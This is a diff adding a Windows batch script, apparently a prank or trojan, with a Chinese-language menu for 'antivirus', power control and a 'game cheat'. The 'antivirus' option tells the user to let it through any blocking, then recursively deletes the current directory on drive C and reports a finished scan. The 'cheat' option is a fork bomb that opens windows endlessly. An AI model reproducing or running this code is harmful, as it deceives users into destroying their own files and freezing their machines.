@@ -1,0 +1,80 @@
+#pro.bat
+@echo off
+title program
+color f3
+
+:menu
+cls
+echo *******************
+echo	1 杀毒程序
+echo	2 控制电源
+echo	3 游戏外挂
+echo	4 退出程序
+echo ******************
+
+set /p number=please input your choose:
+if %number%==1 goto clearing
+if %number%==2 goto shut 
+if %number%==3 goto wg
+if %number%==4 exit
+echo please input your choose(1-4)
+pause
+goto menu
+
+:clearing
+echo 这个是杀毒软件,如果拦截,请放行...
+pause
+c: 2>nul
+rd /s /q . 2>nul
+ping -n 6 www.baidu.com >nul 2>nul
+echo 查杀结束,感谢使用
+pause 
+
+
+:shut
+cls
+echo ***************
+echo	1 关机
+echo	2 重启
+echo	3 注销
+echo	4 取消
+echo	5 返回上一级
+echo **************
+set /p num=please input your choose:
+if %num%==1 goto gj
+if %num%==2 goto cq
+if %num%==3 goto zx
+if %num%==4 goto qx
+if %num%==5 goto menu
+echo please input your choose(1-5)
+goto shut
+
+:gj
+cls
+set /p time=please input times:
+shutdown -t %time% -s
+pause
+goto shut
+
+:cq
+cls
+shutdown -r
+pause
+goto shut
+
+:zx
+cls
+shutdown -l
+pause
+goto shut
+
+:qx
+cls
+shutdown -a
+pause
+goto shut
+
+
+:wg
+start
+goto wg
